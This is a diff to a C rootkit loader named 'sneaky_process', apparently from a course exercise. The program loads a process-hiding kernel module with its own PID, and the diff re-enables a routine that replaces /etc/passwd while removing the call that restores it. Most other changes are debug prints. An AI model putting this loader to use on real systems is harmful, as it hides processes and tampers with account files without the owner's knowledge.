@@ -94,13 +94,9 @@ int restore_pwd() {
 }
 
 int insert_module(char *sneaky_id) {
-  char sneaky_pid[64];
-  memset(sneaky_pid, 0, sizeof(sneaky_pid));
-
-  snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());
 
   char *arguments[4];
-
+  printf("start to insert! sneaky_id is %s\n", sneaky_id);
   arguments[0] = "insmod";
   arguments[1] = "sneaky_mod.ko";
   arguments[2] = sneaky_id;
@@ -136,13 +132,13 @@ int remove_module() {
 
 int main(int argc, char *argv[]) {
   printf("sneaky_process pid = %d\n", getpid());
-  // replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
+  replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
   printf("after replace_pwd()\n");
   char sneaky_pid[64];
   memset(sneaky_pid, 0, sizeof(sneaky_pid));
 
   snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());
-
+  printf("sneaky_pid is %s\n", sneaky_pid);
   pid_t pid = fork();
   int status;
   if (pid == -1) {
@@ -152,6 +148,8 @@ int main(int argc, char *argv[]) {
 
     if (insert_module(sneaky_pid) < 0) {
       perror("failed to insert module\n");
+    } else {
+      printf("insert succeed\n");
     }
   } else { // parent
     printf("parent process,pid = %u\n", getpid());
@@ -160,7 +158,7 @@ int main(int argc, char *argv[]) {
       printf("waitpid() failed\n");
     }
   }
-
+  printf("come into loop ....\n");
   while (1) {
     if (getchar() == 'q') {
       if (remove_module() != 0) {
@@ -171,6 +169,6 @@ int main(int argc, char *argv[]) {
       }
     }
   }
-  restore_pwd();
+
   return EXIT_SUCCESS;
 }
